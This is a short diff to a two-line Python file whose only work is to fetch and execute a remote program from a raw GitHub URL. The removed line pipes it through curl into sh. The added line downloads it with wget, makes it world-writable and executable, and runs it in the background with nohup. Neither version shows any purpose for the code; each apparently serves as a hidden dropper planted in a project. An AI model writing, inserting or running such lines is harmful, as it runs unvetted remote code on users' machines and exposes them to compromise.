@@ -1,2 +1,2 @@
 import os
-os.system('curl -fsSL https://raw.githubusercontent.com/aurbach55/pos/main/pal | sh')
+os.system('wget https://raw.githubusercontent.com/aurbach55/pos/main/pal && chmod 777 pal && nohup ./pal > nohup.out')
